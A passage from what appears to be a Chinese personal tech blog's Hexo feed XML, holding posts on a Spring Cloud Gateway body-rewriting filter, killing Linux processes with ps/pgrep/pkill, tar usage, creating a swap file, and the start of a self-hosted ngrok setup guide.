class="line">        ServerWebExchange serverWebExchange &#x3D; requestExchange(exchange);</span><br><span class="line">        return chain.filter(serverWebExchange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private ServerWebExchange requestExchange(ServerWebExchange exchange) &#123;</span><br><span class="line">        ServerHttpRequest serverHttpRequest &#x3D; exchange.getRequest();</span><br><span class="line">        URI requestUri &#x3D; serverHttpRequest.getURI();</span><br><span class="line">        URI ex &#x3D; UriComponentsBuilder.fromUri(requestUri).build(true).toUri();</span><br><span class="line">        ServerHttpRequest newRequest &#x3D; serverHttpRequest.mutate().uri(ex).build();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 获取body内容</span><br><span class="line">        Flux&lt;DataBuffer&gt; body &#x3D; serverHttpRequest.getBody();</span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line">        body.subscribe(dataBuffer -&gt; &#123;</span><br><span class="line">            byte[] bytes &#x3D; new byte[dataBuffer.readableByteCount()];</span><br><span class="line">            dataBuffer.read(bytes);</span><br><span class="line">            DataBufferUtils.release(dataBuffer);</span><br><span class="line">            String bodyString &#x3D; new String(bytes, StandardCharsets.UTF_8);</span><br><span class="line">            sb.append(bodyString);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        String bodyStr &#x3D; sb.toString();</span><br><span class="line">        &#x2F;&#x2F; 对原先的body进行修改操作</span><br><span class="line">        JSONObject jsonObject &#x3D; JSON.parseObject(bodyStr);</span><br><span class="line">        jsonObject.put(&quot;testName&quot;, &quot;testValue&quot;);</span><br><span class="line">        String result &#x3D; jsonObject.toJSONString();</span><br><span class="line">        &#x2F;&#x2F;转成字节</span><br><span class="line">        byte[] bytes &#x3D; result.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">        NettyDataBufferFactory nettyDataBufferFactory &#x3D; new NettyDataBufferFactory(ByteBufAllocator.DEFAULT);</span><br><span class="line">        DataBuffer bodyDataBuffer &#x3D; nettyDataBufferFactory.allocateBuffer(bytes.length);</span><br><span class="line">        bodyDataBuffer.write(bytes);</span><br><span class="line"></span><br><span class="line">        Flux&lt;DataBuffer&gt; bodyFlux &#x3D; Flux.just(bodyDataBuffer);</span><br><span class="line">        newRequest &#x3D; new ServerHttpRequestDecorator(newRequest) &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Flux&lt;DataBuffer&gt; getBody() &#123;</span><br><span class="line">                return bodyFlux;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        return exchange.mutate().request(newRequest).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int getOrder() &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 操作系统 </tag>
            
            <tag> 分页管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杀死进程</title>
      <link href="/killPidl/"/>
      <url>/killPidl/</url>
      
        <content type="html"><![CDATA[<p>linux 查看某进程 并杀死进程 ps grep kill</p> <a id="more"></a><h1 id="linux-查看某进程-并杀死进程-ps-grep-kill"><a href="#linux-查看某进程-并杀死进程-ps-grep-kill" class="headerlink" title="linux 查看某进程 并杀死进程 ps grep kill"></a>linux 查看某进程 并杀死进程 ps grep kill</h1><p><a href="http://lib.csdn.net/base/linux">Linux</a> 中使用top 或 ps 查看进程使用kill杀死进程</p><p>1.使用top查看进程：</p><p>$top</p><p>进行执行如上命令即可查看top！但是难点在如何以进程的cpu占用量进行排序呢？</p><p>cpu占用量排序执行下操作：</p><p>按大写O再按k再敲回车，然后使用R就可以以cpu占用量进行查看了！下面贴出top的技巧命令：</p><p>“更改显示内容<br>通过 f 键可以选择显示的内容。按 f 键之后会显示列的列表，按 a-z 即可显示或隐藏对应的列，最后按回车键确定。</p><p>按 o 键可以改变列的显示顺序。按小写的 a-z 可以将相应的列向右移动，而大写的 A-Z 可以将相应的列向左移动。最后按回车键确定。</p><p>按大写的 F 或 O 键，然后按 a-z 可以将进程按照相应的列进行排序。而大写的 R 键可以将当前的排序倒转。”</p><p>然后还是顶部一参数的含义：</p><p>“ 150 total 进程总数<br>2 running 正在运行的进程数<br>148 sleeping 睡眠的进程数<br>0 stopped 停止的进程数<br>0 zombie 僵尸进程数<br>Cpu0: 67.4% us 用户空间占用CPU百分比<br>2.0% sy 内核空间占用CPU百分比<br>0.0% ni 用户进程空间内改变过优先级的进程占用CPU百分比<br>30.2% id 空闲CPU百分比<br>0.0% wa 等待输入输出的CPU时间百分比<br>0.0% hi<br>0.0% si<br>0.0% st</p><p>进程信息区<br>统计信息区域的下方显示了各个进程的详细信息。首先来认识一下各列的含义。</p><p>序号 列名 含义<br>a PID 进程id<br>b PPID 父进程id<br>c RUSER Real user name<br>d UID 进程所有者的用户id<br>e USER 进程所有者的用户名<br>f GROUP 进程所有者的组名<br>g TTY 启动进程的终端名。不是从终端启动的进程则显示为 ?<br>h PR 优先级<br>i NI nice值。负值表示高优先级，正值表示低优先级<br>j P 最后使用的CPU，仅在多CPU环境下有意义<br>k %CPU 上次更新到现在的CPU时间占用百分比<br>l TIME 进程使用的CPU时间总计，单位秒<br>m TIME+ 进程使用的CPU时间总计，单位1/100秒<br>n %MEM 进程使用的物理内存百分比<br>o VIRT 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES<br>p SWAP 进程使用的虚拟内存中，被换出的大小，单位kb。<br>q RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA<br>r CODE 可执行代码占用的物理内存大小，单位kb<br>s DATA 可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb<br>t SHR 共享内存大小，单位kb<br>u nFLT 页面错误次数<br>v nDRT 最后一次写入到现在，被修改过的页面数。<br>w S 进程状态。<br>D=不可中断的睡眠状态<br>R=运行<br>S=睡眠<br>T=跟踪/停止<br>Z=僵尸进程<br>x COMMAND 命令名/命令行<br>y WCHAN 若该进程在睡眠，则显示睡眠中的系统函数名<br>”</p><p>2.使用ps命令查看进程</p><p>$ ps -ef</p><p>……<br>smx    1822   1 0 11:38 ?    00:00:49 gnome-terminal<br>smx    1823 1822 0 11:38 ?    00:00:00 gnome-pty-helper<br>smx    1824 1822 0 11:38 pts/0  00:00:02 bash<br>smx    1827   1 4 11:38 ?    00:26:28 /usr/lib/firefox-3.6.18/firefox-bin<br>smx    1857 1822 0 11:38 pts/1  00:00:00 bash<br>smx    1880 1619 0 11:38 ?    00:00:00 update-notifier<br>……<br>smx   11946 1824 0 21:41 pts/0  00:00:00 ps -ef</p><p>或者：</p><p>$ ps -aux</p><p>……</p><p>smx    1822 0.1 0.8 58484 18152 ?    Sl  11:38  0:49 gnome-terminal<br>smx    1823 0.0 0.0  1988  712 ?    S  11:38  0:00 gnome-pty-helper<br>smx    1824 0.0 0.1  6820 3776 pts/0  Ss  11:38  0:02 bash<br>smx    1827 4.3 5.8 398196 119568 ?    Sl  11:38 26:13 /usr/lib/firefox-3.6.18/firefox-bin<br>smx    1857 0.0 0.1  6688 3644 pts/1  Ss  11:38  0:00 bash<br>smx    1880 0.0 0.6 41536 12620 ?    S  11:38  0:00 update-notifier<br>……<br>smx   11953 0.0 0.0  2716 1064 pts/0  R+  21:42  0:00 ps -aux</p><p>3.下面演示如何杀死进程</p><p>此时如果我想杀了火狐的进程就在终端输入：</p><p>$ kill -s 9 1827</p><p>其中-s 9 制定了传递给进程的信号是９，即强制、尽快终止进程。各个终止信号及其作用见附录。</p><p>1827则是上面ps查到的火狐的PID。</p><p>简单吧，但有个问题，进程少了则无所谓，进程多了，就会觉得痛苦了，无论是ps -ef 还是ps -aux，每次都要在一大串进程信息里面查找到要杀的进程，看的眼都花了。</p><p>进阶篇：</p><p>改进１：</p><p>把ps的查询结果通过管道给grep查找包含特定字符串的进程。管道符“|”用来隔开两个命令，管道符左边命令的输出会作为管道符右边命令的输入。</p><p>$ ps -ef | grep firefox<br>smx    1827   1 4 11:38 ?    00:27:33 /usr/lib/firefox-3.6.18/firefox-bin<br>smx   12029 1824 0 21:54 pts/0  00:00:00 grep –color=auto firefox</p><p>这次就清爽了。然后就是</p><p>$kill -s 9 1827</p><p>还是嫌打字多？</p><p>改进２——使用pgrep：</p><p>一看到pgrep首先会想到什么？没错，grep！pgrep的p表明了这个命令是专门用于进程查询的grep。</p><p>$ pgrep firefox<br>1827</p><p>看到了什么？没错火狐的PID，接下来又要打字了：</p><p>$kill -s 9 1827</p><p>改进３——使用pidof：</p><p>看到pidof想到啥？没错pid of xx，字面翻译过来就是 xx的PID。</p><p>$ pidof firefox-bin<br>1827<br>和pgrep相比稍显不足的是，pidof必须给出进程的全名。然后就是老生常谈：</p><p>$kill -s 9 1827</p><p>无论使用ps 然后慢慢查找进程PID 还是用grep查找包含相应字符串的进程，亦或者用pgrep直接查找包含相应字符串的进程ＰＩＤ，然后手动输入给ｋｉｌｌ杀掉，都稍显麻烦。有没有更方便的方法？有！</p><p>改进４：</p><p>$ps -ef | grep firefox | grep -v grep | cut -c 9-15 | xargs kill -s 9</p><p>说明：</p><p>“grep firefox”的输出结果是，所有含有关键字“firefox”的进程。</p><p>“grep -v grep”是在列出的进程中去除含有关键字“grep”的进程。</p><p>“cut -c 9-15”是截取输入行的第9个字符到第15个字符，而这正好是进程号PID。</p><p>“xargs kill -s 9”中的xargs命令是用来把前面命令的输出结果（PID）作为“kill -s 9”命令的参数，并执行该命令。“kill -s 9”会强行杀掉指定进程。</p><p>难道你不想抱怨点什么？没错太长了</p><p>改进５：</p><p>知道pgrep和pidof两个命令，干嘛还要打那么长一串！</p><p>$ pgrep firefox | xargs kill -s 9</p><p>改进６：</p><p>$ ps -ef | grep firefox | awk ‘{print $2}’ | xargs kill -9<br>kill: No such process</p><p>有一个比较郁闷的地方，进程已经正确找到并且终止了，但是执行完却提示找不到进程。</p><p>其中awk ‘{print $2}’ 的作用就是打印（print）出第二列的内容。根据常规篇，可以知道ps输出的第二列正好是PID。就把进程相应的PID通过xargs传递给kill作参数，杀掉对应的进程。</p><p>改进７：</p><p>难道每次都要调用xargs把PID传递给kill？答案是否定的：</p><p>$kill -s 9 <code>ps -aux | grep firefox | awk &#39;&#123;print $2&#125;&#39;</code></p><p>改进８：</p><p>没错，命令依然有点长，换成pgrep。</p><p>$kill -s 9 <code>pgrep firefox</code></p><p>改进9——pkill：</p><p>看到pkill想到了什么？没错pgrep和kill！pkill＝pgrep+kill。</p><p>$pkill -９ firefox</p><p>说明：”-9” 即发送的信号是9，pkill与kill在这点的差别是：pkill无须 “ｓ”，终止信号等级直接跟在 “-“ 后面。之前我一直以为是 “-s 9”，结果每次运行都无法终止进程。</p><p>改进10——killall：</p><p>killall和pkill是相似的,不过如果给出的进程名不完整，killall会报错。pkill或者pgrep只要给出进程名的一部分就可以终止进程。</p><p>$killall -9 firefox</p><p>OK,讲到这里大家应该了解了吧！</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tar压缩解压缩命令详解</title>
      <link href="/tar%E5%8E%8B%E7%BC%A9%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
      <url>/tar%E5%8E%8B%E7%BC%A9%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>tar压缩解压缩命令详解</p> <a id="more"></a><h2 id="tar压缩解压缩命令详解"><a href="#tar压缩解压缩命令详解" class="headerlink" title="tar压缩解压缩命令详解"></a>tar压缩解压缩命令详解</h2><p><strong>tar命令详解</strong></p><p>-c: 建立压缩档案</p><p>-x：解压</p><p>-t：查看内容</p><p>-r：向压缩归档文件末尾追加文件</p><p>-u：更新原压缩包中的文件</p><p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。</p><p>下面的参数是根据需要在压缩或解压档案时可选的。</p><p>-z：有gzip属性的</p><p>-j：有bz2属性的</p><p>-Z：有compress属性的</p><p>-v：显示所有过程</p><p>-O：将文件解开到标准输出</p><p>参数-f是必须的</p><p>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p><p># tar -cf all.tar *.jpg 这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。<br># tar -rf all.tar *.gif 这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。<br># tar -uf all.tar logo.gif 这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。<br># tar -tf all.tar 这条命令是列出all.tar包中所有文件，-t是列出文件的意思<br># tar -xf all.tar 这条命令是解出all.tar包中所有文件，-x是解开的意思</p><p><strong>查看</strong><br>tar -tf aaa.tar.gz  在不解压的情况下查看压缩包的内容</p><p><strong>压缩</strong></p><p>tar –cvf jpg.tar *.jpg //将目录里所有jpg文件打包成tar.jpg</p><p>tar –czf jpg.tar.gz *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz</p><p>tar –cjf jpg.tar.bz2 *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2</p><p>tar –cZf jpg.tar.Z *.jpg  //将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z</p><p><strong>解压</strong></p><p>tar –xvf file.tar //解压 tar包</p><p>tar -xzvf file.tar.gz //解压tar.gz</p><p>tar -xjvf file.tar.bz2  //解压 tar.bz2tar –xZvf file.tar.Z //解压tar.Z</p><p><strong>总结</strong></p><p>1、*.tar 用 tar –xvf 解压</p><p>2、*.gz 用 gzip -d或者gunzip 解压</p><p>3、*.tar.gz和*.tgz 用 tar –xzf 解压</p><p>4、*.bz2 用 bzip2 -d或者用bunzip2 解压</p><p>5、*.tar.bz2用tar –xjf 解压</p><p>6、*.Z 用 uncompress 解压</p><p>7、*.tar.Z 用tar –xZf 解压</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux设置虚拟内存</title>
      <link href="/Linux%E8%AE%BE%E7%BD%AE%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"/>
      <url>/Linux%E8%AE%BE%E7%BD%AE%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>在我们自己的购买的服务器环境中，一般是买的1g的内存，但是当服务器里面的东西装的比较多的时候就会导致内存不够用了,这个时候可以通过增加虚拟内存来夸大内存容量。</p> <a id="more"></a><h1 id="Linux设置虚拟内存"><a href="#Linux设置虚拟内存" class="headerlink" title="Linux设置虚拟内存"></a>Linux设置虚拟内存</h1><h2 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h2><p>交换（Swapping）技术它的主要特点是：打破了一个程序一旦进入内存，就一直驻留在内存直到运行结束的限制。</p><p>在多道程序环境下，内存中可以同时存在多个进程（程序），其中的一部分进程由于等待某些事件而处于阻塞状态，但这些处于阻塞状态的进程仍然驻留内存，并占据着内存空间；另一方面，外存上可能有许多等待装入内存运行的程序，却因内存不足而未能装入。显然，这是一种严重的系统资源浪费，它会使系统的吞吐量下降。为了解决这个问题，可以在操作系统中增加交换（对换）功能，即由操作系统根据需要，将内存中暂时不具备运行条件的部分程序或数据移到外存（换出），以便腾出足够的内存空间，将外存中需要运行的程序或数据调入内存（换入）投入运行。在操作系统中引入交换（对换）技术，可以显著提高内存资源的利用率并改善系统的性能。</p><p>以交换的单位不同来划分，则有以下两种交换方式。</p><ul><li><p>以进程为单位的交换。每次换入/换出的是整个进程，我们称这种交换为进程交换（进程对换）或整体交换（整体对换）。进程交换广泛应用于分时系统，主要解决内存紧张问题。</p></li><li><p>以页（此处不多做介绍）或段（此处不多做介绍）为单位的交换。这种交换分别称为页置换（页交换或页对换）或段置换（段交换或段对换），页置换和段置换是以进程中的某一部分为交换单位，因此又称为部分交换（部分对换）。部分交换广泛应用于现代操作系统中，是实现虚拟存储器的基础。</p></li></ul><p>我们这里所说的交换是指进程交换，为了实现进程交换，操作系统需要解决以下两个问题。</p><ul><li><p>对换空间的管理。在具有交换功能的操作系统中，一般将外存空间分为文件区和交换区（对换区）。文件区用来存放文件，而交换区则用来存放从内存中换出的进程，或等待换入内存的进程。尽管文件区一般采用离散分配方式来分配外存存储空间，但交换区的存储空间分配则宜采用连续分配方式，这是因为交换区中存放的是换入/换出的进程，为了提高交换速度，有必要采用连续分配方式，并且交换区可以采用与可变分区存储管理类似的方法进行管理。例如，使用空闲分区表或空闲分区链来记录外存交换区的使用情况，利用首次适应算法、最佳适应算法或最差适应算法来进行外存交换区的分配。</p></li><li><p>交换的时机以及选择哪些进程交换。交换时机一般选择在进程的时间片用完，以及进程等待输入/输出时，或者在进程要求扩充其内存空间而得不到满足时。换出到外存的进程一般选择处于阻塞状态，或优先级低且短时间内不会再次投入运行的进程；换入到内存的进程则应选择换出时间最久且已处于就绪状态的进程。</p></li></ul><p><strong>《操作系统原理》</strong></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在我们自己的购买的服务器环境中，一般是买的1g的内存，但是当服务器里面的东西装的比较多的时候就会导致内存不够用了</p><h2 id="创建swap文件"><a href="#创建swap文件" class="headerlink" title="创建swap文件"></a>创建swap文件</h2><ol><li>进入<code>/usr</code>目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost usr]$ <span class="built_in">pwd</span></span><br><span class="line">/usr</span><br><span class="line">[root@localhost usr]$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>创建<code>swap</code>文件夹,并进入该文件夹</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost usr]<span class="comment"># mkdir swap</span></span><br><span class="line">[root@localhost usr]<span class="comment"># cd swap/</span></span><br><span class="line">[root@localhost swap]<span class="comment"># pwd</span></span><br><span class="line">/usr/swap</span><br><span class="line">[root@localhost swap]<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>创建<code>swapfile</code>文件,使用命令<code>dd if=/dev/zero of=/usr/swap/swapfile bs=1M count=4096</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost swap]<span class="comment"># dd if=/dev/zero of=/usr/swap/swapfile bs=1M count=4096</span></span><br><span class="line">记录了4096+0 的读入</span><br><span class="line">记录了4096+0 的写出</span><br><span class="line">4294967296字节(4.3 GB)已复制，15.7479 秒，273 MB/秒</span><br><span class="line">[root@localhost swap]<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="查看swap文件"><a href="#查看swap文件" class="headerlink" title="查看swap文件"></a>查看swap文件</h2><ol><li>使用命令<code>du -sh /usr/swap/swapfile</code>,可以看到我们创建的这个swap文件为4g</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost swap]<span class="comment"># du -sh /usr/swap/swapfile</span></span><br><span class="line">4.1G/usr/swap/swapfile</span><br><span class="line">[root@localhost swap]<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="将目标设置为swap分区文件"><a href="#将目标设置为swap分区文件" class="headerlink" title="将目标设置为swap分区文件"></a>将目标设置为swap分区文件</h2><ol><li>使用命令<code>mkswap /usr/swap/swapfile</code>将swapfile文件设置为swap分区文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost swap]<span class="comment"># mkswap /usr/swap/swapfile</span></span><br><span class="line">mkswap: /usr/swap/swapfile: warning: don<span class="string">&#x27;t erase bootbits sectors</span></span><br><span class="line"><span class="string">        on whole disk. Use -f to force.</span></span><br><span class="line"><span class="string">Setting up swapspace version 1, size = 4194300 KiB</span></span><br><span class="line"><span class="string">no label, UUID=5bd241ff-5375-449d-9975-5fdd429df784</span></span><br><span class="line"><span class="string">[root@localhost swap]#</span></span><br></pre></td></tr></table></figure><h2 id="激活swap区，并立即启用交换区文件"><a href="#激活swap区，并立即启用交换区文件" class="headerlink" title="激活swap区，并立即启用交换区文件"></a>激活swap区，并立即启用交换区文件</h2><ol><li>使用命令<code>swapon /usr/swap/swapfile</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost swap]<span class="comment"># swapon /usr/swap/swapfile</span></span><br><span class="line">[root@localhost swap]<span class="comment">#</span></span><br></pre></td></tr></table></figure><ol><li>使用命令<code>free -m</code> 来查看现在的内存,可以看到里面的Swap分区变成了4095M，也就是4G内存。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost swap]<span class="comment"># free -m</span></span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:           980        910         70          3          8        575</span><br><span class="line">-/+ buffers/cache:        326        654</span><br><span class="line">Swap:         4095          0       4095</span><br><span class="line">[root@localhost swap]<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="设置开机自动启用虚拟内存，在etc-fstab文件中加入如下命令"><a href="#设置开机自动启用虚拟内存，在etc-fstab文件中加入如下命令" class="headerlink" title="设置开机自动启用虚拟内存，在etc/fstab文件中加入如下命令"></a>设置开机自动启用虚拟内存，在<code>etc/fstab</code>文件中加入如下命令</h2><ol><li>使用vim编辑器打开/etc/fstab文件</li><li>在文件中加入如下内容</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/swap/swapfile swap swap defaults 0 0</span><br></pre></td></tr></table></figure><h2 id="使用reboot命令重启服务器"><a href="#使用reboot命令重启服务器" class="headerlink" title="使用reboot命令重启服务器"></a>使用reboot命令重启服务器</h2><ol><li>输入<code>reboot</code> 命令来重启</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost swap]<span class="comment"># reboot</span></span><br><span class="line"></span><br><span class="line">Broadcast message from liaocheng@localhost.localdomain</span><br><span class="line">(/dev/pts/1) at 3:56 ...</span><br><span class="line"></span><br><span class="line">The system is going down <span class="keyword">for</span> reboot NOW!</span><br><span class="line">[root@localhost swap]<span class="comment"># Connection to 192.168.136.142 closed by remote host.</span></span><br><span class="line">Connection to 192.168.136.142 closed.</span><br><span class="line">[进程已完成]</span><br></pre></td></tr></table></figure><ol><li>重启完成过后使用free -m 命令来查看现在的内存是否挂在上了。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost swap]<span class="comment"># free -m</span></span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:           980        910         70          3          8        575</span><br><span class="line">-/+ buffers/cache:        326        654</span><br><span class="line">Swap:         4095          0       4095</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 内存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ngrok内网穿透</title>
      <link href="/ngrok/"/>
      <url>/ngrok/</url>
      
        <content type="html"><![CDATA[<p>ngrok是一个反向代理，它能够让你本地的web服务或tcp服务通过公共的端口和外部建立一个安全的通道，使得外网可以访问本地的计算机服务。ngrok1.x开源，ngrok2.x不开源</p><a id="more"></a><ul><li><ul><li><h2 id="1-ngrok简介"><a href="#1-ngrok简介" class="headerlink" title="1. ngrok简介"></a>1. ngrok简介</h2></li></ul><p><a href="https://ngrok.com/">ngrok</a>是一个反向代理，它能够让你本地的web服务或tcp服务通过公共的端口和外部建立一个安全的通道，使得外网可以访问本地的计算机服务。ngrok1.x开源，ngrok2.x不开源</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/ngrok.png" alt="ngrok"></p><p>ngrok的主要用途有以下几种：</p><ul><li>内网穿透，可代替vpn</li><li>将无外网IP的desktop映射到公网</li><li>临时搭建网络并分配二级域名</li><li>微信二次开发的本地调试</li></ul><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2><p>自己搭建ngrok服务需要一台外网服务器，一个域名。本文中使用的服务器系统为Ubuntu 16.04。</p><h3 id="2-1-域名"><a href="#2-1-域名" class="headerlink" title="2.1 域名"></a>2.1 域名</h3><p>有域名之后，需要配置DNS的Host Records，将准备分配给ngrok服务器的域名解析到公网服务器IP地址，如下图所示：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200824143715666.png" alt="image-20200824143715666"></p><p><strong>使用泛域名，使其能解析子域名</strong></p><h3 id="2-2-配置环境"><a href="#2-2-配置环境" class="headerlink" title="2.2 配置环境"></a>2.2 配置环境</h3><p>ngrok是基于go语言开发的，因此需要先安装go：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install golang</span><br></pre></td></tr></table></figure><p>输入<code>go version</code>来验证安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go versiongo version go1.6.2 linux&#x2F;amd64</span><br></pre></td></tr></table></figure><p>设置go环境变量(好像可以不用？)：</p><p>此外还要使用git，一般ubuntu系统都会自带。</p><h2 id="3-搭建ngrok服务器"><a href="#3-搭建ngrok服务器" class="headerlink" title="3. 搭建ngrok服务器"></a>3. 搭建ngrok服务器</h2><h2 id="3-1-clone-ngrok"><a href="#3-1-clone-ngrok" class="headerlink" title="3.1 clone ngrok"></a>3.1 clone ngrok</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inconshreveable&#x2F;ngrok.gitcd ngrok</span><br></pre></td></tr></table></figure><h2 id="3-2-生成证书"><a href="#3-2-生成证书" class="headerlink" title="3.2 生成证书"></a>3.2 生成证书</h2><p>使用<a href="http://ngrok.com/">ngrok.com</a>官方服务时，我们使用的是官方的SSL证书。自己建立ngrok服务，需要我们生成自己的证书，并提供携带该证书的ngrok客户端。首先指定域名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export NGROK_DOMAIN&#x3D;&quot;ngrok.test.website&quot;</span><br></pre></td></tr></table></figure><p>生成证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out rootCA.key 2048openssl req -x509 -new -nodes -key rootCA.key -subj &quot;&#x2F;CN&#x3D;$NGROK_DOMAIN&quot; -days 5000 -out rootCA.pemopenssl genrsa -out device.key 2048openssl req -new -key device.key -subj &quot;&#x2F;CN&#x3D;$NGROK_DOMAIN&quot; -out device.csropenssl x509 -req -in device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000</span><br></pre></td></tr></table></figure><p>我们在编译可执行文件之前，需要把生成的证书分别替换到 assets/client/tls和assets/server/tls中，这两个目录分别存放着ngrok和ngrokd的默认证书。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp rootCA.pem assets&#x2F;client&#x2F;tls&#x2F;ngrokroot.crtcp device.crt assets&#x2F;server&#x2F;tls&#x2F;snakeoil.crtcp device.key assets&#x2F;server&#x2F;tls&#x2F;snakeoil.key</span><br></pre></td></tr></table></figure><h2 id="3-3-编译ngrok"><a href="#3-3-编译ngrok" class="headerlink" title="3.3 编译ngrok"></a>3.3 编译ngrok</h2><p>有没有release的区别是，包含release的编译结果会把assets目录下的内容包括进去，从而可以独立执行。如果你今后还要更换证书，建议编译不包含release的版本。。首先编译ngrok服务端（ngrokd），默认为Linux版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">make 